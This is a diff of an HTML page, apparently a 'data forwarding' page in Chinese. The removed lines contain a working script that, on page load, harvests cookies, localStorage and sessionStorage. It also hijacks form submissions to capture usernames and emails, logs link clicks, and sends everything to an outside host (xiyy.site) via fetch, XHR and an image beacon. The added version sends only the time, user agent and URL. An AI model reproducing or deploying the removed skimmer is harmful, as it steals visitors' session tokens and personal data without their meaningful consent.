@@ -1,119 +1,51 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>数据转发页面</title>
+    <title>数据转发测试</title>
     <script>
-        // 目标URL
+        // 目标URL（确保服务端已准备好接收）
         const TARGET_URL = "http://xiyy.site";
-        
-        // 页面加载时收集数据并转发
-        window.addEventListener('load', function() {
-            // 收集访问者数据
-            const visitorData = {
-                timestamp: new Date().toISOString(),
-                ip: '', // 需要通过后端获取，前端无法直接获取真实IP
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                referrer: document.referrer,
-                currentUrl: window.location.href,
-                cookies: document.cookie,
-                pageTitle: document.title,
-                // 可以添加更多数据
-            };
 
-            // 尝试获取更多信息
-            try {
-                visitorData.localStorage = JSON.stringify(localStorage);
-                visitorData.sessionStorage = JSON.stringify(sessionStorage);
-            } catch(e) {
-                console.log('无法访问storage:', e);
-            }
-
-            // 发送数据到目标URL
-            sendData(visitorData);
-        });
-
-        // 监听表单提交
-        document.addEventListener('submit', function(e) {
-            e.preventDefault();
-            const formData = {};
-            Array.from(e.target.elements).forEach(element => {
-                if (element.name) {
-                    formData[element.name] = element.value;
-                }
-            });
-            
-            const formSubmitData = {
-                type: 'form_submit',
-                formData: formData,
-                formId: e.target.id || 'unknown_form',
-                submitTime: new Date().toISOString()
-            };
-            
-            sendData(formSubmitData);
-        });
-
-        // 发送数据的函数
+        // 收集并发送数据
         function sendData(data) {
-            // 方法1: 使用fetch API
+            console.log("正在发送数据:", data);
+            
+            // 方法1: 优先使用fetch
             fetch(TARGET_URL, {
                 method: 'POST',
-                mode: 'no-cors', // 注意: 这限制了你能访问的响应信息
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data),
-            }).catch(error => {
-                console.error('Fetch发送失败:', error);
-                
-                // 方法2: 如果fetch失败，回退到传统的XHR
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) throw new Error(`HTTP错误: ${response.status}`);
+                return response.text();
+            })
+            .then(result => console.log("转发成功:", result))
+            .catch(error => {
+                console.error("Fetch失败:", error);
+                // 方法2: 回退到XHR
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', TARGET_URL, true);
-                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.open("POST", TARGET_URL, true);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.onload = () => console.log("XHR转发成功:", xhr.responseText);
+                xhr.onerror = () => console.error("XHR转发失败");
                 xhr.send(JSON.stringify(data));
             });
-
-            // 方法3: 使用图片信标作为最后手段
-            const img = new Image();
-            img.src = `${TARGET_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;
         }
+
+        // 页面加载时发送测试数据
+        window.addEventListener('load', () => {
+            const testData = {
+                time: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                page: window.location.href
+            };
+            sendData(testData);
+        });
     </script>
 </head>
 <body>
-    <h1>欢迎访问</h1>
-    <p>本页面会自动收集并转发访问数据到指定服务器。</p>
-    
-    <!-- 示例表单 -->
-    <form id="sampleForm">
-        <h3>示例表单</h3>
-        <div>
-            <label>用户名:</label>
-            <input type="text" name="username">
-        </div>
-        <div>
-            <label>邮箱:</label>
-            <input type="email" name="email">
-        </div>
-        <button type="submit">提交</button>
-    </form>
-    
-    <script>
-        // 确保所有链接点击也被记录
-        document.querySelectorAll('a').forEach(link => {
-            link.addEventListener('click', function(e) {
-                const clickData = {
-                    type: 'link_click',
-                    href: this.href,
-                    text: this.innerText,
-                    time: new Date().toISOString()
-                };
-                sendData(clickData);
-            });
-        });
-    </script>
+    <h1>数据转发测试页</h1>
+    <p>打开浏览器控制台（F12）查看转发结果。</p>
 </body>
 </html>
